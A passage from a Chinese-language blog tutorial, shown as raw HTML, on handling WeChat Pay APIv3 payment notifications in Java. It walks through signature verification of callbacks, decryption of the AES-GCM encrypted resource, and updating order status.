class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> HttpUtils.readData(request);</span><br><span class="line">            Map&lt;String, Object&gt; bodyMap = gson.fromJson(body, HashMap.class);</span><br><span class="line">            <span class="type">String</span> <span class="variable">requestId</span> <span class="operator">=</span> (String) bodyMap.get(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">            log.info(<span class="string">&quot;支付通知的id ===&gt; &#123;&#125;&quot;</span>, requestId);</span><br><span class="line">            log.info(<span class="string">&quot;支付通知的完整数据 ===&gt; &#123;&#125;&quot;</span>, body);</span><br><span class="line">            <span class="comment">// TODO : 签名的验证</span></span><br><span class="line">            <span class="comment">// TODO : 处理订单</span></span><br><span class="line">            <span class="comment">// 成功应答：成功应答必须为200或204，否则就是失败应答</span></span><br><span class="line">            response.setStatus(<span class="number">200</span>);</span><br><span class="line">            map.put(<span class="string">&quot;code&quot;</span>, <span class="string">&quot;SUCCESS&quot;</span>);</span><br><span class="line">            map.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;成功&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            response.setStatus(<span class="number">500</span>);</span><br><span class="line">            map.put(<span class="string">&quot;code&quot;</span>, <span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">            map.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;系统错误&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> gson.toJson(map);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> gson.toJson(map);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="验签"><a href="#验签" class="headerlink" title="验签"></a>验签</h3><blockquote><p><a href="https://pay.weixin.qq.com/wiki/doc/apiv3/wechatpay/wechatpay4_1.shtml">https://pay.weixin.qq.com/wiki/doc/apiv3/wechatpay/wechatpay4_1.shtml</a></p></blockquote><p>商户系统对于开启结果通知的内容一定要做签名验证，并校验通知的信息是否与商户侧的信息一致，防止数据泄露导致出现“假通知”，造成资金损失。  </p><p> <img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220113205113.png"></p><ul><li><p>如果验证商户的请求签名正确，微信支付会在应答的HTTP头部中包括应答签名。微信建议商户验证应答签名。（注解：这里的应答对应图中的第二步，由于使用微信SDK中httpClient发送的请求，所以会自动对响应进行验签)</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CloseableHttpClient httpClient= WechatPayHttpClientBuilder.create()</span><br><span class="line">                .withMerchant(mchId, mchSerialNo, privateKey)<span class="comment">//签名</span></span><br><span class="line">                .withValidator(<span class="keyword">new</span> <span class="title class_">WechatPay2Validator</span>(verifier))<span class="comment">//验签</span></span><br><span class="line">    .build();</span><br></pre></td></tr></table></figure></li><li><p>同样的，微信支付会在回调的HTTP头部中包括回调报文的签名。商户必须验证回调的签名，以确保回调是由微信支付发送。（注解：这里的应答对应图中的第三步，并没有通过httpclient发送请求，所以不会自动验签）我们可以参考SDK源码中的 WechatPay2Validator 创建通知验签工具类 WechatPay2ValidatorForRequest：</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.util;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wechat.pay.contrib.apache.httpclient.auth.Verifier;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.wechat.pay.contrib.apache.httpclient.constant.WechatPayHttpHeaders.*;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WechatPay2ValidatorForRequest</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">log</span> <span class="operator">=</span> LoggerFactory.getLogger(WechatPay2ValidatorForRequest.class);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 应答超时时间，单位为分钟</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">RESPONSE_EXPIRED_MINUTES</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Verifier verifier;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> String body;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> String requestId;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WechatPay2ValidatorForRequest</span><span class="params">(Verifier verifier, String body, String requestId)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.verifier = verifier;</span><br><span class="line">        <span class="built_in">this</span>.body = body;</span><br><span class="line">        <span class="built_in">this</span>.requestId = requestId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> IllegalArgumentException <span class="title function_">parameterError</span><span class="params">(String message, Object... args)</span> &#123;</span><br><span class="line">        message = String.format(message, args);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;parameter error: &quot;</span> + message);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> IllegalArgumentException <span class="title function_">verifyFail</span><span class="params">(String message, Object... args)</span> &#123;</span><br><span class="line">        message = String.format(message, args);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;signature verify fail: &quot;</span> + message);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">validate</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//处理请求参数</span></span><br><span class="line">            validateParameters(request);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//构造验签名串</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> buildMessage(request);</span><br><span class="line">            <span class="comment">//拿到请求头中的证书序列号</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">serial</span> <span class="operator">=</span> request.getHeader(WECHAT_PAY_SERIAL);</span><br><span class="line">            <span class="comment">//拿到请求头中的签名</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">signature</span> <span class="operator">=</span> request.getHeader(WECHAT_PAY_SIGNATURE);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//验签</span></span><br><span class="line">            <span class="keyword">if</span> (!verifier.verify(serial, message.getBytes(StandardCharsets.UTF_8), signature)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> verifyFail(<span class="string">&quot;serial=[%s] message=[%s] sign=[%s], request-id=[%s]&quot;</span>,</span><br><span class="line">                        serial, message, signature, request.getHeader(REQUEST_ID));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">            log.warn(e.getMessage());</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">validateParameters</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// <span class="doctag">NOTE:</span> ensure HEADER_WECHAT_PAY_TIMESTAMP at last</span></span><br><span class="line">        String[] headers = &#123;WECHAT_PAY_SERIAL, WECHAT_PAY_SIGNATURE, WECHAT_PAY_NONCE, WECHAT_PAY_TIMESTAMP&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">header</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (String headerName : headers) &#123;</span><br><span class="line">            header = request.getHeader(headerName);</span><br><span class="line">            <span class="keyword">if</span> (header == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> parameterError(<span class="string">&quot;empty [%s], request-id=[%s]&quot;</span>, headerName, requestId);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">timestampStr</span> <span class="operator">=</span> header;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Instant</span> <span class="variable">responseTime</span> <span class="operator">=</span> Instant.ofEpochSecond(Long.parseLong(timestampStr));</span><br><span class="line">            <span class="comment">// 拒绝过期应答</span></span><br><span class="line">            <span class="keyword">if</span> (Duration.between(responseTime, Instant.now()).abs().toMinutes() &gt;= RESPONSE_EXPIRED_MINUTES) &#123;</span><br><span class="line">                <span class="keyword">throw</span> parameterError(<span class="string">&quot;timestamp=[%s] expires, request-id=[%s]&quot;</span>, timestampStr, requestId);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (DateTimeException | NumberFormatException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> parameterError(<span class="string">&quot;invalid timestamp=[%s], request-id=[%s]&quot;</span>, timestampStr, requestId);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> String <span class="title function_">buildMessage</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">timestamp</span> <span class="operator">=</span> request.getHeader(WECHAT_PAY_TIMESTAMP);</span><br><span class="line">        <span class="type">String</span> <span class="variable">nonce</span> <span class="operator">=</span> request.getHeader(WECHAT_PAY_NONCE);</span><br><span class="line">        <span class="keyword">return</span> timestamp + <span class="string">&quot;\n&quot;</span></span><br><span class="line">                + nonce + <span class="string">&quot;\n&quot;</span></span><br><span class="line">                + body + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 通知接口添加验签：</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.google.gson.Gson;</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line"><span class="meta">@CrossOrigin</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;api/wx-pay&quot;)</span></span><br><span class="line"><span class="meta">@Api(tags = &quot;网站的微信支付API&quot;)</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WxPayController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> WxPayService wxPayService;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> Verifier verifer;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/native/&#123;productId&#125;&quot;)</span></span><br><span class="line">    <span class="meta">@ApiOperation(&quot;调用统一下单API,生成支付二维码&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> R <span class="title function_">nativePay</span><span class="params">(<span class="meta">@PathVariable</span> Long productId)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        log.info(<span class="string">&quot;发起支付请求&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//返回订单编号以及支付二维码</span></span><br><span class="line">        Map&lt;String, Object&gt; map = wxPayService.nativePay(productId);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> R.ok().setData(map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ApiOperation(&quot;支付通知&quot;)</span></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/native/notify&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">nativeNotify</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="type">Gson</span> <span class="variable">gson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>();</span><br><span class="line">        Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> HttpUtils.readData(request);</span><br><span class="line">            Map&lt;String, Object&gt; bodyMap = gson.fromJson(body, HashMap.class);</span><br><span class="line">            <span class="type">String</span> <span class="variable">requestId</span> <span class="operator">=</span> (String) bodyMap.get(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">            log.info(<span class="string">&quot;支付通知的id ===&gt; &#123;&#125;&quot;</span>, requestId);</span><br><span class="line">            log.info(<span class="string">&quot;支付通知的完整数据 ===&gt; &#123;&#125;&quot;</span>, body);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//签名的验证</span></span><br><span class="line">            <span class="type">WechatPay2ValidatorForRequest</span> <span class="variable">wechatPay2ValidatorForRequest</span></span><br><span class="line">                    <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WechatPay2ValidatorForRequest</span>(verifer, body, requestId);</span><br><span class="line">            <span class="keyword">if</span> (!wechatPay2ValidatorForRequest.validate(request)) &#123;</span><br><span class="line">                log.error(<span class="string">&quot;通知验签失败&quot;</span>);</span><br><span class="line">                <span class="comment">//失败应答</span></span><br><span class="line">                response.setStatus(<span class="number">500</span>);</span><br><span class="line">                map.put(<span class="string">&quot;code&quot;</span>, <span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">                map.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;系统错误&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> gson.toJson(map);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// TODO : 处理订单</span></span><br><span class="line">            <span class="comment">// 成功应答：成功应答必须为200或204，否则就是失败应答</span></span><br><span class="line">            response.setStatus(<span class="number">200</span>);</span><br><span class="line">            map.put(<span class="string">&quot;code&quot;</span>, <span class="string">&quot;SUCCESS&quot;</span>);</span><br><span class="line">            map.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;成功&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            response.setStatus(<span class="number">500</span>);</span><br><span class="line">            map.put(<span class="string">&quot;code&quot;</span>, <span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">            map.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;系统错误&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> gson.toJson(map);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> gson.toJson(map);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="参数解密"><a href="#参数解密" class="headerlink" title="参数解密"></a>参数解密</h3></li></ul><blockquote><p><a href="https://pay.weixin.qq.com/wiki/doc/apiv3/wechatpay/wechatpay4_2.shtml">https://pay.weixin.qq.com/wiki/doc/apiv3/wechatpay/wechatpay4_2.shtml</a></p></blockquote><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220113205113.png"></p><p>下面详细描述对通知数据进行解密的流程：</p><ol><li>用商户平台上设置的APIv3密钥【<a href="https://pay.weixin.qq.com/">微信商户平台</a>—&gt;账户设置—&gt;API安全—&gt;设置APIv3密钥】，记为key；</li><li>针对resource.algorithm中描述的算法（目前为AEAD_AES_256_GCM），取得对应的参数nonce和associated_data；</li><li>使用key、nonce和associated_data，对数据密文resource.ciphertext进行解密，得到JSON形式的资源对象；</li></ol><p>我们可以通过参考<a href="https://github.com/wechatpay-apiv3/wechatpay-apache-httpclient/blob/master/src/main/java/com/wechat/pay/contrib/apache/httpclient/util/AesUtil.java">AesUtil.Java</a>对证书和回调解密。</p><p>在nativeNotify 方法中添加处理订单的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 处理订单</span></span><br><span class="line">wxPayService.processOrder(bodyMap);</span><br></pre></td></tr></table></figure><p>实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.google.gson.Gson;</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WxPayServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">WxPayService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> WxPayConfig wxPayConfig;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> CloseableHttpClient wxPayClient;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> OrderInfoService orderInfoService;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">        </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processOrder</span><span class="params">(Map&lt;String, Object&gt; bodyMap)</span> <span class="keyword">throws</span> GeneralSecurityException &#123;</span><br><span class="line">        log.info(<span class="string">&quot;处理订单&quot;</span>);</span><br><span class="line">        <span class="comment">//转换明文 </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">plainText</span> <span class="operator">=</span> decryptFromResource(bodyMap);</span><br><span class="line">        <span class="comment">//更新订单状态 </span></span><br><span class="line">        <span class="comment">//记录支付日志</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 使用Api v3密钥进行对称解密</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bodyMap</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> GeneralSecurityException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">decryptFromResource</span><span class="params">(Map&lt;String, Object&gt; bodyMap)</span> <span class="keyword">throws</span> GeneralSecurityException &#123;</span><br><span class="line">        log.info(<span class="string">&quot;密文解密&quot;</span>);</span><br><span class="line">        <span class="comment">//通知数据</span></span><br><span class="line">        Map&lt;String, String&gt; resourceMap = (Map) bodyMap.get(<span class="string">&quot;resource&quot;</span>);</span><br><span class="line">        <span class="comment">//数据密文</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">ciphertext</span> <span class="operator">=</span> resourceMap.get(<span class="string">&quot;ciphertext&quot;</span>);</span><br><span class="line">        <span class="comment">//随机串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">nonce</span> <span class="operator">=</span> resourceMap.get(<span class="string">&quot;nonce&quot;</span>);</span><br><span class="line">        <span class="comment">//附加数据</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">associatedData</span> <span class="operator">=</span> resourceMap.get(<span class="string">&quot;associated_data&quot;</span>);</span><br><span class="line">        log.info(<span class="string">&quot;密文 ===&gt; &#123;&#125;&quot;</span>, ciphertext);</span><br><span class="line">        <span class="type">AesUtil</span> <span class="variable">aesUtil</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesUtil</span>(wxPayConfig.getApiV3Key().getBytes(StandardCharsets.UTF_8));</span><br><span class="line">        <span class="type">String</span> <span class="variable">plainText</span> <span class="operator">=</span> aesUtil.decryptToString(associatedData.getBytes(StandardCharsets.UTF_8),</span><br><span class="line">                nonce.getBytes(StandardCharsets.UTF_8),</span><br><span class="line">                ciphertext);</span><br><span class="line">        log.info(<span class="string">&quot;明文 ===&gt; &#123;&#125;&quot;</span>, plainText);</span><br><span class="line">        <span class="keyword">return</span> plainText;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="更新订单状态和记录支付日志"><a href="#更新订单状态和记录支付日志" class="headerlink" title="更新订单状态和记录支付日志"></a>更新订单状态和记录支付日志</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.google.gson.Gson;</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WxPayServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">WxPayService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> WxPayConfig wxPayConfig;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> CloseableHttpClient wxPayClient;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> OrderInfoService orderInfoService;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">        </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processOrder</span><span class="params">(Map&lt;String, Object&gt; bodyMap)</span> <span class="keyword">throws</span> GeneralSecurityException &#123;</span><br><span class="line">        log.info(<span class="string">&quot;处理订单&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">plainText</span> <span class="operator">=</span> decryptFromResource(bodyMap);</span><br><span class="line">        <span class="comment">// 转换明文</span></span><br><span class="line">        <span class="type">Gson</span> <span class="variable">gson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>();</span><br><span class="line">        Map&lt;String, Object&gt; plainTextMap = gson.fromJson(plainText, HashMap.class);</span><br><span class="line">        <span class="comment">// 获取商户订单号</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">orderNo</span> <span class="operator">=</span> (String) plainTextMap.get(<span class="string">&quot;out_trade_no&quot;</span>);</span><br><span class="line">        <span class="comment">// 更新订单状态</span></span><br><span class="line">        orderInfoService.updateStatusByOrderNo(orderNo, OrderStatus.SUCCESS);</span><br><span class="line">        <span class="comment">// 记录支付日志</span></span><br><span class="line">        paymentInfoService.createPaymentInfo(plainText);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>更新订单状态：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td 